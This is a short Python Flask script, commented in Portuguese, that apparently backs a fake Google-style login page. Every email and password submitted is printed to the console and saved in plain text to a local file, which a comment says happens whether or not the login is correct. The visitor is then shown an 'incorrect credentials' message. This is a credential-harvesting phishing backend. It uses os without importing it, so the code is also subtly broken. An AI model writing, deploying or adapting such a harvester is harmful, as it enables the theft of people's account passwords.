from flask import Flask, render_template, request

app = Flask(__name__)
app.secret_key = 'sial123'

def criar_bloco_notas(nome_usuario, dados):
    try:
        diretorio = 'C:\\Users\\Igor\\Downloads\\Python\\Template google'

        # Verificar se o diretório existe, caso contrário, criar
        if not os.path.exists(diretorio):
            os.makedirs(diretorio)

        # Gerar o caminho do arquivo
        contador = 1
        caminho_arquivo = os.path.join(diretorio, f'{nome_usuario}_{contador}.txt')

        # Verificar se o arquivo já existe
        while os.path.exists(caminho_arquivo):
            contador += 1
            caminho_arquivo = os.path.join(diretorio, f'{nome_usuario}_{contador}.txt')

        # Criar o arquivo e escrever os dados fornecidos pelo usuário
        with open(caminho_arquivo, 'w') as arquivo:
            arquivo.write(f"Dados inseridos por {nome_usuario}:\n")
            for dado in dados:
                arquivo.write(f"{dado}\n")

        return caminho_arquivo
    except Exception as e:
        return None

@app.route('/', methods=['GET', 'POST'])
def index():
    mensagem_erro = None

    if request.method == 'POST':
        email = request.form.get('email')
        password = request.form.get('password')

        print("Email:", email, flush=True)
        print("Senha:", password, flush=True)

        dados = [f"Email: {email}", f"Senha: {password}"]  # Dados inseridos pelo usuário

        # Criação do bloco de notas independentemente das credenciais estarem corretas
        criar_bloco_notas(email.split('@')[0], dados)

        # Mostra mensagem de erro se email ou senha estiverem vazios ou incorretos
        if not email or not password or (email != 'sial@gmail.com' or password != 'sial123'):
            mensagem_erro = 'Email e/ou senha incorretos. Por favor, tente novamente.'

    return render_template('index.html', mensagem_erro=mensagem_erro)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
